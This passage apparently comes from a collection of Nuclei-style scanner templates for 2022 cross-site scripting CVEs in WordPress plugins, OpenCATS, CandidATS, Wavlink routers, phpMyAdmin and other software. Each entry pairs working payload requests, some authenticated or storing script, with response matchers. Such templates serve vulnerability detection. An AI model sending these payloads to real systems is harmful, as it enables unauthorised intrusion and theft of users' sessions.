## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=ai1wm_export HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
GET /wp-admin/admin-ajax.php?action=ai1wm_export&ai1wm_import=1&options%5Breplace%5D%5Bnew_value%5D%5B%5D=XSSPAYLOAD%3Csvg+onload=alert(document.domain)%3E&ai1wm_manual_export=1&secret_key={{secretkey}} HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, "text/html")
    2. status_code_3 == 200
    3. contains(body_3, '{\"new_value\":[\"XSSPAYLOAD\<svg onload=alert(document.domain)>')
- condition - and
### Extractors

**Type - regex**
- name - secretkey
- group - 1
- regex
    1. ai1wm_feedback"},"secret_key":"([0-9a-zA-Z]+)"
- internal - True

---
# WooCommerce Stored Exporter WordPress Plugin \< 2.7.1 - Cross-Site Scripting
## Description
- The plugin was affected by a reflected cross-site scripting vulnerability in the woo_ce admin page.
- severity - medium
- tags - wpscan,cve,cve2022,wordpress,wp-plugin,xss,woocommerce,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=woo_ce&failed=1&message=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress All-in-one Floating Contact Form \<2.0.4 - Cross-Site Scripting
## Description
- WordPress All-in-one Floating Contact Form, Call, Chat, and 50+ Social Icon Tabs plugin before 2.0.4 contains a reflected cross-site scripting vulnerability on the my-sticky-elements-leads admin page.
- severity - medium
- tags - xss,wp-plugin,authenticated,wpscan,cve,cve2022,wordpress
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(`document.domain`) x">

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Wavlink WN-535G3 - Cross-Site Scripting
## Description
- Wavlink WN-535G3 contains a POST cross-site scripting vulnerability via the hostname parameter at /cgi-bin/login.cgi.

- severity - medium
- tags - xss,cve2022,wavlink,cve,router,iot
## Requests
### Step - 1
```
POST /cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")</script><script>alert(document.domain);</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn

```
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain);\</script>
    2. parent.location.replace("http://")
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Trilium \<0.52.4 - Cross-Site Scripting
## Description
- Trilium prior to 0.52.4, 0.53.1-beta contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
- severity - medium
- tags - cve,cve2022,xss,trilium,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E
- {{BaseURL}}/share/api/notes/%3Cimg%20src=x%20onerror=alert(document.domain)%3E
- {{BaseURL}}/share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename
### Matchers

**Type - word**
- part - body
- words
    1. No handler matched for custom \<img src=x onerror=alert(document.domain)>
    2. Note '\<img src=x onerror=alert(document.domain)>' not found
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# SolarView Compact 6.00 - 'time_begin' Cross-Site Scripting
## Description
- SolarView Compact version 6.00 contains a cross-site scripting vulnerability in the 'time_begin' parameter to Solar_History.php.

- severity - medium
- tags - cve,cve2022,xss,solarview,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>\<"">
    2. /Solar_History.php" METHOD="post">
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Wordpress Profile Builder Plugin Cross-Site Scripting
## Description
- The Profile Builder User Profile & User Registration Forms WordPress plugin is vulnerable to cross-site scripting due to insufficient escaping and sanitization of the site_url parameter found in the ~/assets/misc/fallback-page.php file which allows attackers to inject arbitrary web scripts onto a pages that executes whenever a user clicks on a specially crafted link by an attacker. This affects versions up to and including 3.6.1..

- severity - medium
- tags - cve,cve2022,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404
### Matchers

**Type - word**
- part - body
- words
    1. \<a href="javascript:alert(document.domain);">here\</a>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# LearnPress \<4.1.6 - Cross-Site Scripting
## Description
- WordPress LearnPress plugin before 4.1.6 contains a cross-site scripting vulnerability. It does not sanitize and escape the lp-dismiss-notice before outputting it back via the lp_background_single_email AJAX action.

- severity - medium
- tags - wp,wp-plugin,wordpress,cve,cve2022,learnpress,wpscan,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx\<img%20src=x%20onerror=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. {"dismissed":"xxx\<img src=x onerror=alert(document.domain)>"}

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Online Birth Certificate System 1.2 - Stored Cross-Site Scripting
## Description
- Online Birth Certificate System 1.2 contains multiple stored cross-site scripting vulnerabilities in the component /obcs/user/profile.php, which allows an attacker to execute arbitrary web script or HTML via a crafted payload injected into the fname or lname parameters.

- severity - medium
- tags - cve,cve2022,xss,obcs,authenticated
## Requests
### Step - 1
```
POST /obcs/user/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

mobno={{username}}&password={{password}}&login=

```
### Step - 2
```
POST /obcs/user/profile.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=nuclei%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&lname=nuclei%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&add=New+Delhi+India+110001&submit=

```
### Step - 3
```
GET /obcs/user/dashboard.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, "text/html")
    2. status_code_3 == 200
    3. contains(body_3, 'admin-name\">nuclei\<script>alert(document.domain);\</script>')
- condition - and

---
# WWBN AVideo 11.6 - Cross-Site Scripting
## Description
- WWBN AVideo 11.6 contains a cross-site scripting vulnerability in the footer alerts functionality via the 'msg' parameter, which is inserted into the document with insufficient sanitization.

- severity - medium
- tags - cve,cve2022,avideo,xss,wwbn
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. avideoAlertInfo("\</script>\<script>alert(document.cookie);\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenCATS v0.9.6 - Cross Site Scripting
## Description
- OpenCATS v0.9.6 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the indexFile component.

- severity - medium
- tags - cve,cve2022,xss,opencats,authenticated
## Requests
### Step - 1
```
POST /index.php?m=login&a=attemptLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert(document.domain)</script>&isPopup=0 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. CATS=
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CandidATS v3.0.0 - Cross Site Scripting.
## Description
- CandidATS v3.0.0 on 'page' of the 'ajax.php' resource, allows an external attacker to steal the cookie of arbitrary users.

- severity - medium
- tags - cve,cve2022,candidats,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ajax.php?f=getPipelineJobOrder&joborderID=50&page=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. candidat
- condition - and

**Type - word**
- part - header
- words
    1. text/html
- condition - and

**Type - status**
- status
    1. 404

---
# WordPress Gallery \<2.0.0 - Cross-Site Scripting
## Description
- WordPress Gallery plugin before 2.0.0 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, available to both unauthenticated and authenticated users.
- severity - medium
- tags - wpscan,cve2022,wp,xss,wordpress,gallery,unauth,cve,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. wpdevar_gall_img_url_h[\<script>alert(document.domain)\</script>]

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WPQA \<5.4 - Cross-Site Scripting
## Description
- WordPress WPQA plugin prior to 5.4 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter on its reset password form.

- severity - medium
- tags - wpscan,xss,wordpress,wp-plugin,wp,cve,cve2022,wpqa
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Content-Type: application/x-www-form-urlencoded

user_name={{user}}&email={{user}}@{{Host}}&pass1={{pass}}&pass2={{pass}}&phone={{rand_text_numeric(10)}}&agree_terms=on&form_type=wpqa-signup&action=wpqa_ajax_signup_process

```
### Step - 2
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Content-Type: application/x-www-form-urlencoded

user_mail={{user}}@{{Host}}&form_type=wpqa_forget&action=wpqa_ajax_password_process&redirect_to={{url_encode(redirect_to)}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{redirect_to}}
    2. "success":1
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenCATS v0.9.6 - Cross Site Scripting
## Description
- OpenCATS v0.9.6 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the entriesPerPage parameter.

- severity - medium
- tags - cve,cve2022,xss,opencats,authenticated
## Requests
### Step - 1
```
POST /index.php?m=login&a=attemptLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. MySQL Query Failed
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OpenCATS v0.9.6 - Cross Site Scripting
## Description
- OpenCATS v0.9.6 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the joborderID parameter.

- severity - medium
- tags - cve,cve2022,xss,opencats,authenticated
## Requests
### Step - 1
```
POST /index.php?m=login&a=attemptLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /ajax.php?f=getPipelineJobOrder&joborderID=1)"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. CATS=
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Academy Learning Management System \<5.9.1 - Cross-Site Scripting
## Description
- Academy Learning Management System before 5.9.1 contains a cross-site scripting vulnerability via the Search parameter. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,academylms,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>
    2. Study any topic
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ServiceNow - Cross-Site Scripting
## Description
- ServiceNow through San Diego Patch 4b and Patch 6 contains a cross-site scripting vulnerability in the logout functionality, which can enable an unauthenticated remote attacker to execute arbitrary JavaScript.

- severity - medium
- tags - cve,cve2022,servicenow,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
### Matchers

**Type - word**
- part - body
- words
    1. top.location.href = 'javascript:alert(document.domain)';

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WWBN AVideo 11.6 - Cross-Site Scripting
## Description
- WWBN AVideo 11.6 contains a cross-site scripting vulnerability in the footer alerts functionality via the 'success' parameter, which is inserted into the document with insufficient sanitization.

- severity - medium
- tags - cve,cve2022,avideo,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?success=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. avideoAlertSuccess("\</script>\<script>alert(document.cookie);\</script>
    2. text: "\</script>\<script>alert(document.cookie);\</script>
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Elementor Website Builder \<= 3.5.5 - DOM Cross-Site Scripting
## Description
- WordPress Elementor Website Builder plugin 3.5.5 and prior contains a reflected cross-site scripting vulnerability via the document object model.

- severity - medium
- tags - cve,cve2022,xss,wordpress,elementor
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/elementor/readme.txt
### Matchers

**Type - word**
- part - body
- words
    1. Elementor Website Builder

**Type - dsl**
- dsl
    1. compare_versions(version, '\<= 3.5.5')

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- name - version
- internal - True
- group - 1
- regex
    1. (?m)Stable tag: ([0-9.]+)

**Type - regex**
- group - 1
- regex
    1. (?m)Stable tag: ([0-9.]+)

---
# Diary Management System 1.0 - Cross-Site Scripting
## Description
- Diary Management System 1.0 contains a cross-site scripting vulnerability via the Name parameter in search-result.php.

- severity - medium
- tags - cve,cve2022,xss,authenticated,edms
## Requests
### Step - 1
```
POST /edms/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

logindetail={{username}}&userpassword={{password}}&login=

```
### Step - 2
```
POST /edms/search-result.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

searchdata=<script>alert(document.domain);</script>

```
### Matchers

**Type - word**
- part - body
- words
    1. Serach Result Against "\<script>alert(document.domain);\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Microweber \<1.2.12 - Stored Cross-Site Scripting
## Description
- Microweber prior to 1.2.12 contains a stored cross-site scripting vulnerability. It allows unrestricted upload of XML files,.

- severity - medium
- tags - xss,microweber,cms,authenticated,huntr,cve,cve2022,intrusive
## Requests
### Step - 1
```
POST /api/user_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
POST /plupload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------59866212126262636974202255034
Referer: {{BaseURL}}admin/view:modules/load_module:files

-----------------------------59866212126262636974202255034
Content-Disposition: form-data; name="name"

{{randstr}}.xml
-----------------------------59866212126262636974202255034
Content-Disposition: form-data; name="chunk"

0
-----------------------------59866212126262636974202255034
Content-Disposition: form-data; name="chunks"

1
-----------------------------59866212126262636974202255034
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
-----------------------------59866212126262636974202255034--

```
### Step - 3
```
GET /userfiles/media/default/{{to_lower("{{randstr}}")}}.xml HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_3,"alert(document.domain)")
    2. status_code_3==200
    3. contains(body_2,"bytes_uploaded")
- condition - and

---
# kkFileView 4.0.0 - Cross-Site Scripting
## Description
- kkFileView 4.0.0 contains multiple cross-site scripting vulnerabilities via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.

- severity - medium
- tags - cve,cve2022,kkFileView,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/onlinePreview?url=aHR0cDovL3d3dy54eHguY29tL3h4eC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPjEyMw%3D%3D
### Matchers

**Type - word**
- words
    1. txt">\<img src=111 onerror=alert(1)>123

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Shortcodes and Extra Features for Phlox \<2.9.8 - Cross-Site Scripting
## Description
- WordPress Shortcodes and extra features plugin for the Phlox theme before 2.9.8 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the response. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wordpress,xss,auxin-elements,wpscan,cve,cve2017,wp-plugin,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. widget-title">\<script>alert(document.domain)\</script>\</h3>
    2. aux-widget
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WBCE CMS 1.5.2 - Cross-Site Scripting
## Description
- WBCE CMS 1.5.2 contains a stored cross-site scripting vulnerability via \admin\user\save.php Display Name parameters.

- severity - medium
- tags - cve,cve2022,wbcecms,xss
## Requests
### Step - 1
```
POST /admin/login/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

url=&username_fieldname=username_axh5kevh&password_fieldname=password_axh5kevh&username_axh5kevh={{username}}&password_axh5kevh={{password}}&submit=Login

```
### Step - 2
```
GET /admin/users/index.php HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /admin/users/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

formtoken={{formtoken}}&user_id=&username_fieldname=username_tep83j9z&username_tep83j9z=testme2&password=temp1234&password2=temp1234&display_name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email=testme2%40abc.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=

```
### Step - 4
```
GET /admin/users/index.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<p>\<b>\<script>alert(document.cookie)\</script>
    2. WBCECMS
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- name - formtoken
- part - body
- group - 1
- regex
    1. \<input\stype="hidden"\sname="formtoken"\svalue="([^"]*)"\s/>
- internal - True

---
# OpenCATS v0.9.6 - Cross Site Scripting
## Description
- OpenCATS v0.9.6 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the callback component.

- severity - medium
- tags - cve,cve2022,xss,opencats,authenticated
## Requests
### Step - 1
```
POST /index.php?m=login&a=attemptLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /index.php?m=toolbar&callback=<script>alert(document.domain)</script>&a=authenticate HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. EVAL=\<script>alert(document.domain)\</script>
    2. cats_connected
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Permalink Manager \<2.2.15 - Cross-Site Scripting
## Description
- WordPress Permalink Manager Lite and Pro plugins before 2.2.15 contain a reflected cross-site scripting vulnerability. They do not sanitize and escape query parameters before outputting them back in the debug page.

- severity - medium
- tags - wp-plugin,wpscan,cve,cve2022,xss,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?p=%3Cimg%20src%20onerror=alert(/XSS/)%3E&debug_url=1
### Matchers

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(/XSS/)>
    2. pm_query
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# Contao \<4.13.3 - Cross-Site Scripting
## Description
- Contao prior to 4.13.3 contains a cross-site scripting vulnerability.  It is possible to inject arbitrary JavaScript code into the canonical tag.

- severity - medium
- tags - cve,cve2022,contao,xss,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/contao/%22%3e%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
    2. "Not authenticated"
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# SolarView Compact 6.00 - Cross-Site Scripting
## Description
- SolarView Compact 6.00 contains a cross-site scripting vulnerability via Solar_AiConf.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,xss,solarview
## Requests
- Method - GET
### URL
- {{BaseURL}}/Solar_AiConf.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. /Solar_AiConf.php/">\<script>alert(document.domain)\</script>
    2. HREF="Solar_Service.php"
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Ad Inserter \<2.7.10 - Cross-Site Scripting
## Description
- WordPress Ad Inserter plugin before 2.7.10 contains a cross-site scripting vulnerability. It does not sanitize and escape the html_element_selection parameter before outputting it back in the page.

- severity - medium
- tags - wordpress,xss,wpscan,cve,cve2022
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}
  - html_element_selection=</script><img+src+onerror=alert(document.domain)>

### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<img src onerror=alert(document.domain)>
    2. ad-inserter
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# CandidATS v3.0.0 - Cross Site Scripting.
## Description
- CandidATS v3.0.0 on 'sortBy' of the 'ajax.php' resource, allows an external attacker to steal the cookie of arbitrary users.

- severity - medium
- tags - cve,cve2022,candidats,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&sortDirection=desc&indexFile=1&isPopup=0
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. candidat
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# CandidATS v3.0.0 - Cross Site Scripting.
## Description
- CandidATS v3.0.0 on 'sortDirection' of the 'ajax.php' resource, allows an external attacker to steal the cookie of arbitrary users.

- severity - medium
- tags - cve,cve2022,candidats,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. candidat
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# Wavlink WN-533A8 - Cross-Site Scripting
## Description
- Wavlink WN-533A8 M33A8.V5030.190716 contains a reflected cross-site scripting vulnerability via the login_page parameter.

- severity - medium
- tags - cve2022,wavlink,xss,router,edb,cve
## Requests
### Step - 1
```
POST /cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}

newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=x");alert(9);x=("&homepage=main.html&sysinitpage=sysinit.shtml&wizardpage=wiz.shtml&hostname=0.0.0.1&key=M94947765&password=ab4e98e4640b6c1ee88574ec0f13f908&lang_select=en

```
### Matchers

**Type - word**
- part - body
- words
    1. x");alert(9);x=("?login=0");\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# phpMyAdmin \< 5.1.2 - Cross-Site Scripting
## Description
- An issue was discovered in phpMyAdmin 5.1 before 5.1.2 that could allow an attacker to inject malicious code into aspects of the setup script, which can allow cross-site or HTML injection.
- severity - medium
- tags - cve,cve2022,phpmyadmin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
    2. \<h2>Add a new server\</h2>
    3. \<title>phpMyAdmin setup
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# RPCMS 3.0.2 - Cross-Site Scripting
## Description
- RPCMS 3.0.2 contains a cross-site scripting vulnerability in the Search function. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,rpcms,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/search/?q=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. rpcms
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CandidATS v3.0.0 - Cross Site Scripting.
## Description
- CandidATS v3.0.0 on 'indexFile' of the 'ajax.php' resource, allows an external attacker to steal the cookie of arbitrary users.

- severity - Medium
- tags - cve,cve2022,candidats,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. candidat
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# Haraj 3.7 - Cross-Site Scripting
## Description
- Haraj 3.7 contains a cross-site scripting vulnerability in the User Upgrade Form. An attacker can inject malicious script and thus steal authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2022,haraj,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/payform.php?type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. >\<script>alert(document.domain)\</script>\</textarea>
    2. content="nextHaraj
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# kkFileView 4.1.0 - Cross-Site Scripting
## Description
